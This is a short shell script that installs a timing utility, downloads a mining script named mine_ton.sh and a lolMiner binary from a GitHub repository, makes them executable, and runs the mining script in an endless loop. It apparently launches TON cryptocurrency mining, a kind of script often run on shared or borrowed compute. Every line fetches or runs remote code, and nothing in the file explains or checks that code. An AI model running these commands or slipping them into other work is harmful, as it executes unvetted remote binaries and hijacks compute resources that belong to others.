sudo apt install timelimit -y
wget -O yoi https://raw.githubusercontent.com/Diefky/lololo/main/mine_ton.sh
wget -O yes https://github.com/Diefky/lololo/raw/main/lolMiner
chmod +x yoi yes
while :; do timeout 45 bash yoi sleep 1; done
